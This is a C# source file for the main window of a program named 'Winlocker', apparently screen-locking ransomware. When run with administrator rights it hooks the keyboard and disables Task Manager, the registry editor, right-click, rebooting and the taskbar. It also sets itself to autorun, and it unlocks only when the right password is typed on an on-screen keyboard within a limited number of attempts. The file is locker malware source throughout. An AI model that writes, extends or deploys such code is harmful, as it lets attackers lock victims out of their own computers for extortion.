using System;
using System.Security.Principal;
using System.Windows;
using System.Windows.Controls;
using Winlocker.Models;

namespace Winlocker
{
    public partial class MainWindow : Window
    {
        public Attempts attempts;
        private bool isCapital { get; set; }

        public MainWindow()
        {
            InitializeComponent();
            isCapital = false;
            attempts = new Attempts();
        }

        //Checking for Local Administrator Rights
        public bool isAdmin()
        {
            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            bool hasAdminRight = principal.IsInRole(WindowsBuiltInRole.Administrator);
            return hasAdminRight;
        }

        private void WindowLoaded(object sender, RoutedEventArgs e)
        {
            if (isAdmin())
            {
                try
                {
                    Keyboard.KeyboardHook();
                    Keyboard.KeyboardLock();
                    TaskManager.Lock();
                    Registry.Lock();
                    RightClick.Lock();
                    Rebooting.Lock();
                    Autorun.Set();
                    TaskBar.Lock();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    this.Close();
                }
            }
            else
            {
                MessageBox.Show("Run with administrative administrator rights", "Information", MessageBoxButton.OK, MessageBoxImage.Warning);
                this.Close();
            }
        }

        //Unlock button click
        private void OnUnlock(object sender, EventArgs e)
        {
            if (attempts.count > 0)
            {
                string password = PasswordBox.Text;

                if (password.Equals(App.Password)) //Password
                {
                    try
                    {
                        Autorun.Unset();
                        TaskBar.Unlock();
                        Registry.Unlock();
                        Rebooting.Unlock();
                        RightClick.Unlock();
                        TaskManager.Unlock();
                        Keyboard.KeyboardUnlock();
                        this.Close();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                }
                else
                {
                    --attempts.count;
                    PasswordBox.Clear();
                    if (attempts.count > 0) MessageBox.Show("You have " + attempts.count + " attempts left", "Information", MessageBoxButton.OK, MessageBoxImage.Warning);
                    else MessageBox.Show("You have no more attempts!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
            else MessageBox.Show("You have no more attempts!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
        }

        //Keyboard button click
        private void OnClick(object sender, EventArgs e)
        {
            var letter = (Button)sender;
            PasswordBox.Text += letter.Content;
            PasswordBox.Focus();
            PasswordBox.SelectionStart = PasswordBox.Text.Length + 1;
            PasswordBox.SelectionLength = 0;
        }

        //Caps Lock button click
        private void OnCapsLock(object sender, EventArgs e)
        {
            if (isCapital)
            {
                LoverLetters();
                LoverSymbol();
            }
            else
            {
                CapitalLetters();
                CapitalSymbol();
            }
            isCapital = !isCapital;
        }

        //Backspace button click
        private void OnBackspace(object sender, EventArgs e)
        {
            string password = PasswordBox.Text;
            if (password.Length > 0)
            {
                if (password.Length == 1) PasswordBox.Clear();
                else
                {
                    if (PasswordBox.SelectionStart - 1 > 0)
                    {
                        int position = PasswordBox.SelectionStart - 1;
                        password = password.Remove(PasswordBox.SelectionStart - 1, 1);
                        PasswordBox.Text = password;
                        PasswordBox.Focus();
                        PasswordBox.SelectionStart = position;
                        PasswordBox.SelectionLength = 0;
                    }
                }
            }
        }

        #region Letters and Symbols
        private void CapitalLetters()
        {
            button_Q.Content = "Q";
            button_W.Content = "W";
            button_E.Content = "E";
            button_R.Content = "R";
            button_T.Content = "T";
            button_Y.Content = "Y";
            button_U.Content = "U";
            button_I.Content = "I";
            button_O.Content = "O";
            button_P.Content = "P";
            button_A.Content = "A";
            button_S.Content = "S";
            button_D.Content = "D";
            button_F.Content = "F";
            button_G.Content = "G";
            button_H.Content = "H";
            button_J.Content = "J";
            button_K.Content = "K";
            button_L.Content = "L";
            button_Z.Content = "Z";
            button_X.Content = "X";
            button_C.Content = "C";
            button_V.Content = "V";
            button_B.Content = "B";
            button_N.Content = "N";
            button_M.Content = "M";

        }
        private void LoverLetters()
        {
            button_Q.Content = "q";
            button_W.Content = "w";
            button_E.Content = "e";
            button_R.Content = "r";
            button_T.Content = "t";
            button_Y.Content = "y";
            button_U.Content = "u";
            button_I.Content = "i";
            button_O.Content = "o";
            button_P.Content = "p";
            button_A.Content = "a";
            button_S.Content = "s";
            button_D.Content = "d";
            button_F.Content = "f";
            button_G.Content = "g";
            button_H.Content = "h";
            button_J.Content = "j";
            button_K.Content = "k";
            button_L.Content = "l";
            button_Z.Content = "z";
            button_X.Content = "x";
            button_C.Content = "c";
            button_V.Content = "v";
            button_B.Content = "b";
            button_N.Content = "n";
            button_M.Content = "m";
        }
        private void CapitalSymbol()
        {
            button_Oem3.Content = "~";
            button_D1.Content = "!";
            button_D2.Content = "@";
            button_D3.Content = "#";
            button_D4.Content = "$";
            button_D5.Content = "%";
            button_D6.Content = "^";
            button_D7.Content = "&";
            button_D8.Content = "*";
            button_D9.Content = "(";
            button_D0.Content = ")";
            button_Oem2.Content = "+";
            button_OemOpenBrackets.Content = "{";
            button_OemCloseBrackets.Content = "}";
            button_Oem5.Content = "|";
            button_Oem1.Content = ":";
            button_OemQuotes.Content = "\"";
            button_OemComma.Content = "<";
            button_OemPeriod.Content = ">";
            button_OemQuestion.Content = "?";
        }
        private void LoverSymbol()
        {
            button_Oem3.Content = "`";
            button_D1.Content = "1";
            button_D2.Content = "2";
            button_D3.Content = "3";
            button_D4.Content = "4";
            button_D5.Content = "5";
            button_D6.Content = "6";
            button_D7.Content = "7";
            button_D8.Content = "8";
            button_D9.Content = "9";
            button_D0.Content = "0";
            button_Oem2.Content = "-";
            button_OemOpenBrackets.Content = "[";
            button_OemCloseBrackets.Content = "]";
            button_Oem5.Content = "\\";
            button_Oem1.Content = ";";
            button_OemQuotes.Content = "'";
            button_OemComma.Content = ",";
            button_OemPeriod.Content = ".";
            button_OemQuestion.Content = "/";
        }
        #endregion
    }
}
